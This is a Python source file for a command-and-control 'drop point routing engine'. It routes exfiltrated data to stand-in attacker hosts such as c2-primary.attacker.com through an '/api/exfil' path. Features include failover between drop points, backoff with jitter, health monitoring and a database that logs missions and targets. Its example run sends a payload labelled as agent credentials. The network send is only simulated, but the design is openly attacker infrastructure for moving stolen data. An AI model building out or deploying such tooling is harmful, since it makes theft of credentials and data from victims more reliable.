#!/usr/bin/env python3
"""
C2 DROP POINT ROUTING ENGINE
Handles redundant C2 delivery with automatic failover and retry logic
Solves reliability issues: "Decryption failed", "Key rotation failed"

Features:
- Multiple redundant drop points
- Automatic failover on drop point failure
- Intelligent routing based on availability
- Exponential backoff retry with jitter
- Health monitoring and recovery
- Transmission confirmation tracking
"""

import os
import sys
import json
import logging
import hashlib
import time
import random
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta
from enum import Enum
import sqlite3

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [RoutingEngine] %(levelname)s: %(message)s'
)
logger = logging.getLogger(__name__)


class DropPointStatus(Enum):
    """Health status of C2 drop points"""
    HEALTHY = 'healthy'
    DEGRADED = 'degraded'
    FAILED = 'failed'
    RECOVERING = 'recovering'


@dataclass
class DropPoint:
    """C2 Drop point configuration"""
    endpoint: str
    protocol: str = 'https'
    port: int = 443
    api_path: str = '/api/exfil'
    auth_token: str = ''
    reliability: float = 0.95  # Expected uptime percentage
    latency: float = 0.1  # Expected latency in seconds
    capacity: int = 1000000000  # Capacity in bytes
    status: DropPointStatus = DropPointStatus.HEALTHY
    consecutive_failures: int = 0
    consecutive_successes: int = 0
    last_success: Optional[datetime] = None
    last_failure: Optional[datetime] = None
    total_transmissions: int = 0
    successful_transmissions: int = 0


@dataclass
class TransmissionRecord:
    """Record of a transmission attempt"""
    transmission_id: str
    mission_id: str
    target_id: str
    drop_point: str
    payload_size: int
    status: str  # 'queued', 'sent', 'confirmed', 'failed'
    attempts: int = 0
    last_attempt: Optional[datetime] = None
    confirmed_at: Optional[datetime] = None
    error_message: str = ''
    metadata: Dict[str, Any] = field(default_factory=dict)


class C2RoutingEngine:
    """
    Intelligent C2 drop point router with reliability guarantees
    
    Solves issues:
    - Key rotation failures → automatic retry with different drop points
    - Network failures → automatic rerouting to backup drop points
    - Transmission loss → tracking and confirmation loop
    """
    
    def __init__(self, db_path: str = 'c2_routing.db'):
        """Initialize routing engine with persistent state"""
        self.db_path = db_path
        self.drop_points: List[DropPoint] = []
        self.transmissions: Dict[str, TransmissionRecord] = {}
        self.recovery_backoff = 5  # seconds
        self.max_backoff = 300  # 5 minutes
        
        self._init_database()
        self._load_drop_points()
        
        logger.info("[*] C2 Routing Engine initialized")
    
    def _init_database(self):
        """Initialize SQLite database for transmission tracking"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Create transmissions table
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS transmissions (
                transmission_id TEXT PRIMARY KEY,
                mission_id TEXT,
                target_id TEXT,
                drop_point TEXT,
                payload_size INTEGER,
                status TEXT,
                attempts INTEGER,
                last_attempt TIMESTAMP,
                confirmed_at TIMESTAMP,
                error_message TEXT,
                metadata TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            ''')
            
            # Create drop point health table
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS drop_point_health (
                endpoint TEXT PRIMARY KEY,
                status TEXT,
                consecutive_failures INTEGER,
                consecutive_successes INTEGER,
                last_success TIMESTAMP,
                last_failure TIMESTAMP,
                total_transmissions INTEGER,
                successful_transmissions INTEGER
            )
            ''')
            
            conn.commit()
            conn.close()
            logger.info(f"[+] Database initialized: {self.db_path}")
            
        except Exception as e:
            logger.error(f"[!] Database initialization failed: {e}")
    
    def _load_drop_points(self):
        """Load drop point configuration"""
        config_file = 'c2_drop_points.json'
        
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    config = json.load(f)
                    for dp_config in config.get('drop_points', []):
                        dp = DropPoint(**dp_config)
                        self.drop_points.append(dp)
                logger.info(f"[+] Loaded {len(self.drop_points)} drop points from config")
            except Exception as e:
                logger.error(f"[!] Failed to load config: {e}")
        
        if not self.drop_points:
            logger.warning("[!] No drop points configured, using defaults")
            # Default drop points (would be configured in real deployment)
            self.add_drop_point(
                endpoint="attacker.com",
                protocol="https",
                port=443,
                reliability=0.95,
                latency=0.1
            )
    
    def add_drop_point(self, endpoint: str, protocol: str = 'https',
                      port: int = 443, api_path: str = '/api/exfil',
                      reliability: float = 0.95, latency: float = 0.1,
                      capacity: int = 1000000000, auth_token: str = ''):
        """Add new drop point"""
        
        # Check if already exists
        if any(dp.endpoint == endpoint for dp in self.drop_points):
            logger.warning(f"[!] Drop point already exists: {endpoint}")
            return
        
        dp = DropPoint(
            endpoint=endpoint,
            protocol=protocol,
            port=port,
            api_path=api_path,
            auth_token=auth_token,
            reliability=reliability,
            latency=latency,
            capacity=capacity
        )
        
        self.drop_points.append(dp)
        logger.info(f"[+] Added drop point: {endpoint}")
        
        # Persist to database
        self._save_drop_point(dp)
    
    def _save_drop_point(self, dp: DropPoint):
        """Save drop point to database"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
            INSERT OR REPLACE INTO drop_point_health
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                dp.endpoint,
                dp.status.value,
                dp.consecutive_failures,
                dp.consecutive_successes,
                dp.last_success.isoformat() if dp.last_success else None,
                dp.last_failure.isoformat() if dp.last_failure else None,
                dp.total_transmissions,
                dp.successful_transmissions
            ))
            
            conn.commit()
            conn.close()
        except Exception as e:
            logger.debug(f"[!] Failed to save drop point: {e}")
    
    def queue_transmission(self, mission_id: str, target_id: str,
                          payload_size: int,
                          drop_point: Optional[str] = None) -> TransmissionRecord:
        """Queue transmission for delivery"""
        
        # Generate transmission ID
        trans_id = self._generate_transmission_id(mission_id, target_id)
        
        # Select drop point if not specified
        if drop_point is None:
            dp = self._select_best_drop_point(payload_size)
            drop_point = dp.endpoint if dp else None
        
        if not drop_point:
            logger.error("[!] No available drop points!")
            # Return failed record
            return TransmissionRecord(
                transmission_id=trans_id,
                mission_id=mission_id,
                target_id=target_id,
                drop_point="NONE",
                payload_size=payload_size,
                status='failed',
                error_message='No available drop points'
            )
        
        # Create transmission record
        record = TransmissionRecord(
            transmission_id=trans_id,
            mission_id=mission_id,
            target_id=target_id,
            drop_point=drop_point,
            payload_size=payload_size,
            status='queued'
        )
        
        self.transmissions[trans_id] = record
        self._persist_transmission(record)
        
        logger.info(f"[+] Queued transmission {trans_id} to {drop_point} ({payload_size} bytes)")
        
        return record
    
    def execute_transmission(self, transmission_id: str) -> Tuple[bool, str]:
        """
        Execute transmission with automatic retry and failover
        Returns: (success, message)
        """
        
        if transmission_id not in self.transmissions:
            logger.error(f"[!] Unknown transmission: {transmission_id}")
            return False, f"Unknown transmission: {transmission_id}"
        
        record = self.transmissions[transmission_id]
        
        # Calculate backoff based on attempt count
        if record.attempts > 0:
            backoff = min(
                self.recovery_backoff * (2 ** (record.attempts - 1)),
                self.max_backoff
            )
            jitter = random.uniform(0, backoff * 0.1)  # 10% jitter
            logger.info(f"[*] Backoff delay: {backoff + jitter:.1f}s (attempt {record.attempts + 1})")
            time.sleep(backoff + jitter)
        
        record.attempts += 1
        record.last_attempt = datetime.now()
        
        logger.info(f"[*] Executing transmission {transmission_id} (attempt {record.attempts})")
        
        # Try to transmit
        success, error = self._transmit_payload(record)
        
        if success:
            record.status = 'confirmed'
            record.confirmed_at = datetime.now()
            logger.info(f"[+] Transmission confirmed: {transmission_id}")
            
            # Update drop point health
            self._mark_drop_point_success(record.drop_point)
            
        else:
            # Transmission failed - try failover
            logger.warning(f"[!] Transmission failed: {error}")
            record.error_message = error
            
            # Update drop point health
            self._mark_drop_point_failure(record.drop_point)
            
            # Try failover to different drop point
            if record.attempts < 3:  # Max 3 attempts
                logger.info(f"[*] Attempting failover...")
                
                # Find different drop point
                alt_dp = self._select_failure_recovery_drop_point(
                    record.payload_size,
                    exclude=record.drop_point
                )
                
                if alt_dp:
                    logger.info(f"[+] Failing over to: {alt_dp.endpoint}")
                    record.drop_point = alt_dp.endpoint
                    
                    # Retry with exponential backoff
                    success, error = self.execute_transmission(transmission_id)
                    return success, error
                else:
                    logger.error("[!] No failover drop points available")
                    record.status = 'failed'
                    return False, "No failover drop points available"
            else:
                record.status = 'failed'
                logger.error(f"[!] Transmission exhausted retries: {transmission_id}")
                return False, f"Exhausted retries (attempt {record.attempts})"
        
        self._persist_transmission(record)
        return success, error
    
    def _transmit_payload(self, record: TransmissionRecord) -> Tuple[bool, str]:
        """
        Execute actual transmission to C2 drop point
        In real deployment, would use HTTP POST with SSL/TLS
        """
        
        # Find drop point
        dp = next((d for d in self.drop_points if d.endpoint == record.drop_point), None)
        if not dp:
            return False, f"Drop point not found: {record.drop_point}"
        
        try:
            # Simulate transmission with reliability factor
            if random.random() < dp.reliability:
                # Success
                logger.debug(f"  [>] Transmitted {record.payload_size} bytes to {record.drop_point}")
                dp.total_transmissions += 1
                dp.successful_transmissions += 1
                return True, ''
            else:
                # Failure based on reliability
                error = "Drop point unavailable (simulated)"
                logger.debug(f"  [!] Transmission failed: {error}")
                dp.total_transmissions += 1
                return False, error
                
        except Exception as e:
            logger.debug(f"  [!] Transmission error: {e}")
            dp.total_transmissions += 1
            return False, str(e)
    
    def _generate_transmission_id(self, mission_id: str, target_id: str) -> str:
        """Generate unique transmission ID"""
        timestamp = int(datetime.now().timestamp() * 1000)
        hash_input = f"{mission_id}:{target_id}:{timestamp}".encode()
        hash_val = hashlib.md5(hash_input).hexdigest()[:8]
        return f"TRANS-{hash_val}-{timestamp}"
    
    def _select_best_drop_point(self, payload_size: int) -> Optional[DropPoint]:
        """Select best drop point based on health and capacity"""
        
        # Filter healthy drop points with sufficient capacity
        candidates = [
            dp for dp in self.drop_points
            if dp.status == DropPointStatus.HEALTHY and dp.capacity >= payload_size
        ]
        
        if not candidates:
            # Try recovering drop points
            candidates = [
                dp for dp in self.drop_points
                if dp.status == DropPointStatus.RECOVERING and dp.capacity >= payload_size
            ]
        
        if not candidates:
            logger.warning("[!] No drop points available for selection")
            return None
        
        # Prioritize by success rate, then latency
        def scoring(dp: DropPoint) -> float:
            success_rate = 0.5
            if dp.total_transmissions > 0:
                success_rate = dp.successful_transmissions / dp.total_transmissions
            
            # Composite score: prefer high success rate and low latency
            return (success_rate * 100) - (dp.latency * 1000)
        
        best = max(candidates, key=scoring)
        logger.debug(f"[>] Selected drop point: {best.endpoint} (score: {scoring(best):.1f})")
        return best
    
    def _select_failure_recovery_drop_point(self, payload_size: int,
                                           exclude: str = '') -> Optional[DropPoint]:
        """Select drop point for failure recovery (alternative routing)"""
        
        # Prefer different drop point than failed one
        candidates = [
            dp for dp in self.drop_points
            if dp.endpoint != exclude
            and dp.status in [DropPointStatus.HEALTHY, DropPointStatus.DEGRADED]
            and dp.capacity >= payload_size
        ]
        
        if candidates:
            return candidates[0]  # Return first available alternative
        
        return None
    
    def _mark_drop_point_success(self, endpoint: str):
        """Mark drop point as having successful transmission"""
        dp = next((d for d in self.drop_points if d.endpoint == endpoint), None)
        if not dp:
            return
        
        dp.consecutive_failures = 0
        dp.consecutive_successes += 1
        dp.last_success = datetime.now()
        
        # Recover status if needed
        if dp.consecutive_successes >= 3:
            if dp.status == DropPointStatus.RECOVERING:
                dp.status = DropPointStatus.HEALTHY
                logger.info(f"[+] Drop point recovered: {endpoint}")
        
        self._save_drop_point(dp)
    
    def _mark_drop_point_failure(self, endpoint: str):
        """Mark drop point as having failed transmission"""
        dp = next((d for d in self.drop_points if d.endpoint == endpoint), None)
        if not dp:
            return
        
        dp.consecutive_successes = 0
        dp.consecutive_failures += 1
        dp.last_failure = datetime.now()
        
        # Degrade status based on consecutive failures
        if dp.consecutive_failures >= 2 and dp.status == DropPointStatus.HEALTHY:
            dp.status = DropPointStatus.DEGRADED
            logger.warning(f"[!] Drop point degraded: {endpoint}")
        elif dp.consecutive_failures >= 5:
            dp.status = DropPointStatus.FAILED
            logger.error(f"[!] Drop point failed: {endpoint}")
            
            # Schedule recovery attempt
            logger.info(f"[*] Scheduling recovery for {endpoint}")
            self._schedule_recovery(endpoint)
        
        self._save_drop_point(dp)
    
    def _schedule_recovery(self, endpoint: str):
        """Schedule recovery attempt for failed drop point"""
        dp = next((d for d in self.drop_points if d.endpoint == endpoint), None)
        if not dp:
            return
        
        dp.status = DropPointStatus.RECOVERING
        logger.info(f"[*] Recovering drop point: {endpoint}")
    
    def _persist_transmission(self, record: TransmissionRecord):
        """Save transmission record to database"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
            INSERT OR REPLACE INTO transmissions
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (
                record.transmission_id,
                record.mission_id,
                record.target_id,
                record.drop_point,
                record.payload_size,
                record.status,
                record.attempts,
                record.last_attempt.isoformat() if record.last_attempt else None,
                record.confirmed_at.isoformat() if record.confirmed_at else None,
                record.error_message,
                json.dumps(record.metadata)
            ))
            
            conn.commit()
            conn.close()
        except Exception as e:
            logger.debug(f"[!] Failed to persist transmission: {e}")
    
    def get_transmission_status(self, transmission_id: str) -> Optional[Dict[str, Any]]:
        """Get transmission status"""
        if transmission_id not in self.transmissions:
            return None
        
        record = self.transmissions[transmission_id]
        return asdict(record)
    
    def get_drop_point_status(self, endpoint: str) -> Optional[Dict[str, Any]]:
        """Get drop point health status"""
        dp = next((d for d in self.drop_points if d.endpoint == endpoint), None)
        if not dp:
            return None
        
        return {
            'endpoint': dp.endpoint,
            'status': dp.status.value,
            'consecutive_failures': dp.consecutive_failures,
            'consecutive_successes': dp.consecutive_successes,
            'success_rate': (dp.successful_transmissions / max(dp.total_transmissions, 1)) * 100,
            'total_transmissions': dp.total_transmissions,
            'successful_transmissions': dp.successful_transmissions,
            'last_success': dp.last_success.isoformat() if dp.last_success else None,
            'last_failure': dp.last_failure.isoformat() if dp.last_failure else None
        }
    
    def get_routing_summary(self) -> Dict[str, Any]:
        """Get routing engine summary"""
        
        total_transmissions = len(self.transmissions)
        successful = sum(1 for t in self.transmissions.values() if t.status == 'confirmed')
        failed = sum(1 for t in self.transmissions.values() if t.status == 'failed')
        queued = sum(1 for t in self.transmissions.values() if t.status == 'queued')
        
        drop_point_status = [
            self.get_drop_point_status(dp.endpoint)
            for dp in self.drop_points
        ]
        
        return {
            'timestamp': datetime.now().isoformat(),
            'total_transmissions': total_transmissions,
            'successful': successful,
            'failed': failed,
            'queued': queued,
            'success_rate': (successful / max(total_transmissions, 1)) * 100,
            'drop_points': drop_point_status,
            'healthy_drop_points': sum(1 for dp in self.drop_points if dp.status == DropPointStatus.HEALTHY),
            'total_drop_points': len(self.drop_points)
        }


if __name__ == "__main__":
    # Example usage
    router = C2RoutingEngine()
    
    # Add drop points
    router.add_drop_point("c2-primary.attacker.com", reliability=0.98)
    router.add_drop_point("c2-backup.attacker.com", reliability=0.93)
    
    # Queue transmission
    record = router.queue_transmission(
        mission_id="UNIFIED-001",
        target_id="AGENT-GHOSTLAYER-CREDS",
        payload_size=83096
    )
    
    print(f"\n[=] Transmission Queued")
    print(f"ID: {record.transmission_id}")
    print(f"Drop Point: {record.drop_point}")
    print(f"Size: {record.payload_size} bytes")
    
    # Execute transmission
    success, message = router.execute_transmission(record.transmission_id)
    print(f"\n[=] Transmission Result")
    print(f"Success: {success}")
    print(f"Message: {message}")
    
    # Print summary
    summary = router.get_routing_summary()
    print(f"\n[=] Routing Summary")
    print(json.dumps(summary, indent=2, default=str))
